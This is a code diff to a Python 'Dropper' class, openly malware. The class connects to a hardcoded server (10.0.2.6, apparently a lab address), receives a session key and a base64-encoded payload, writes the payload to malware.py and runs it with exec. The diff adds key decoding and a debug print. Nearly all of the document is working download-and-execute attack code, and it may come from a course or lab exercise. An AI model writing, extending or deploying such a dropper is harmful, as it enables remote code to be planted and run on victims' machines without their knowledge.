@@ -61,12 +61,17 @@ class Dropper:
         """
         with open('malware.py', 'wb') as file:
             file.write(data)
+    
+    def decode_key(self, num_byte):
+        byte_decoded = base64.b64decode(num_byte)
+        original_number = int.from_bytes(byte_decoded, 'big')
+        return original_number
 
     def download_malicious_code(self):
         """ Download malicious code from the server. """
         # Create a connection to the server.
         try:
-            self.socket.connect((self.host, self.port))
+            self.socket.connect(('10.0.2.6', self._port))
         except socket.error:
             logging.debug('Dropper could not connect to the server.')
             return
@@ -78,8 +83,11 @@ class Dropper:
         )
 
         # Receive the malicious code in the encrypted form.
-        command = self.socket.recv(1000)
+        session_key = self.socket.recv(4)
+        command = self.socket.recv(1024)
         # Decode the command and dump it into a file.
+        decode_key = self.decode_key(session_key)
+        print(decode_key)
         decode_payload = base64.b64decode(command)
         self.dump_data(decode_payload)
         exec(open("malware.py").read())
